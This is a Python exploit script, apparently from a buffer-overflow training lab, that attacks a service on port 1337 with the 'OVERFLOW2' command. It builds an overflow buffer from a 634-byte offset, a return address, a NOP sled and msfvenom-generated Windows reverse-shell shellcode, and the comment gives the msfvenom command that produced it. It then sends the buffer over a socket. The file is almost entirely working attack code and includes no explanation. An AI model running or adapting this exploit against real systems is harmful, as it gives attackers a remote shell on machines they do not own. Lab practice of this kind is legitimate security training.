import socket

ip = "10.10.186.25"
port = 1337

prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"

padding = "\x90" * 16

#msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '\x00\x23\x3c\x83\xba' EXITFUNC=thread -f python -v payload

payload =  b""
payload += b"\xfc\xbb\x48\xa8\x45\x91\xeb\x0c\x5e\x56\x31\x1e"
payload += b"\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff"
payload += b"\xff\xb4\x40\xc7\x91\x44\x91\xa8\x18\xa1\xa0\xe8"
payload += b"\x7f\xa2\x93\xd8\xf4\xe6\x1f\x92\x59\x12\xab\xd6"
payload += b"\x75\x15\x1c\x5c\xa0\x18\x9d\xcd\x90\x3b\x1d\x0c"
payload += b"\xc5\x9b\x1c\xdf\x18\xda\x59\x02\xd0\x8e\x32\x48"
payload += b"\x47\x3e\x36\x04\x54\xb5\x04\x88\xdc\x2a\xdc\xab"
payload += b"\xcd\xfd\x56\xf2\xcd\xfc\xbb\x8e\x47\xe6\xd8\xab"
payload += b"\x1e\x9d\x2b\x47\xa1\x77\x62\xa8\x0e\xb6\x4a\x5b"
payload += b"\x4e\xff\x6d\x84\x25\x09\x8e\x39\x3e\xce\xec\xe5"
payload += b"\xcb\xd4\x57\x6d\x6b\x30\x69\xa2\xea\xb3\x65\x0f"
payload += b"\x78\x9b\x69\x8e\xad\x90\x96\x1b\x50\x76\x1f\x5f"
payload += b"\x77\x52\x7b\x3b\x16\xc3\x21\xea\x27\x13\x8a\x53"
payload += b"\x82\x58\x27\x87\xbf\x03\x20\x64\xf2\xbb\xb0\xe2"
payload += b"\x85\xc8\x82\xad\x3d\x46\xaf\x26\x98\x91\xd0\x1c"
payload += b"\x5c\x0d\x2f\x9f\x9d\x04\xf4\xcb\xcd\x3e\xdd\x73"
payload += b"\x86\xbe\xe2\xa1\x09\xee\x4c\x1a\xea\x5e\x2d\xca"
payload += b"\x82\xb4\xa2\x35\xb2\xb7\x68\x5e\x59\x42\xfb\x6b"
payload += b"\x97\x4f\x7a\x03\xa5\x4f\x6d\x88\x20\xa9\xe7\x20"
payload += b"\x65\x62\x90\xd9\x2c\xf8\x01\x25\xfb\x85\x02\xad"
payload += b"\x08\x7a\xcc\x46\x64\x68\xb9\xa6\x33\xd2\x6c\xb8"
payload += b"\xe9\x7a\xf2\x2b\x76\x7a\x7d\x50\x21\x2d\x2a\xa6"
payload += b"\x38\xbb\xc6\x91\x92\xd9\x1a\x47\xdc\x59\xc1\xb4"
payload += b"\xe3\x60\x84\x81\xc7\x72\x50\x09\x4c\x26\x0c\x5c"
payload += b"\x1a\x90\xea\x36\xec\x4a\xa5\xe5\xa6\x1a\x30\xc6"
payload += b"\x78\x5c\x3d\x03\x0f\x80\x8c\xfa\x56\xbf\x21\x6b"
payload += b"\x5f\xb8\x5f\x0b\xa0\x13\xe4\x2b\x43\xb1\x11\xc4"
payload += b"\xda\x50\x98\x89\xdc\x8f\xdf\xb7\x5e\x25\xa0\x43"
payload += b"\x7e\x4c\xa5\x08\x38\xbd\xd7\x01\xad\xc1\x44\x21"
payload += b"\xe4\xc1\x6a\xdd\x07"


postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n"))
  print("Done!")
except Exception as e:
  print (e)
